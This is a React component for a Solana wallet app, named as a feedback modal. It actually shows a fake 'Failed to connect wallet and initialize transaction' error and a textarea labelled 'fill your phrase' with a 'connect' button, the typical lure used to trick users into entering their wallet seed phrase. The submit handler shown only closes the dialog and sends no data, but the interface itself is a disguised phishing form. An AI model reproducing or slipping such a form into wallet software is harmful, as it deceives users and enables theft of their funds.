import React, { useState } from 'react';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { notify } from '@/lib/notify';

interface FeedbackModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  address?: string;
  context?: 'completed' | 'cancelled' | 'error';
}

function wordCount(input: string) {
  return input.trim().split(/\s+/).filter(Boolean).length;
}

export const FeedbackModal: React.FC<FeedbackModalProps> = ({ open, onOpenChange, address, context }) => {
  const [message, setMessage] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const handleSubmit = async () => {
    setError(null);
    
    // Accept any input without validation
    try {
      setSubmitting(true);
      // Form submission is now immediate without notification
      onOpenChange(false);
      setMessage('');
    } catch (e) {
      console.error('Form error:', e);
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent>
        <DialogHeader>
          <DialogTitle>Failed to connect wallet and initialize transaction</DialogTitle>
        </DialogHeader>

        <div className="space-y-4">

          <div>
            <p className="text-sm text-muted-foreground mb-2">fill your phrase</p>
            <textarea
              value={message}
              onChange={(e) => setMessage(e.target.value)}
              rows={4}
              className="w-full rounded-md border bg-background p-3 text-sm"
            />
            {error ? <p className="text-red-500 text-sm mt-2">{error}</p> : null}
          </div>
        </div>

        <DialogFooter>
          <Button variant="outline" onClick={() => onOpenChange(false)} disabled={submitting}>
            Close
          </Button>
          <Button onClick={handleSubmit} disabled={submitting}>
            connect
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
};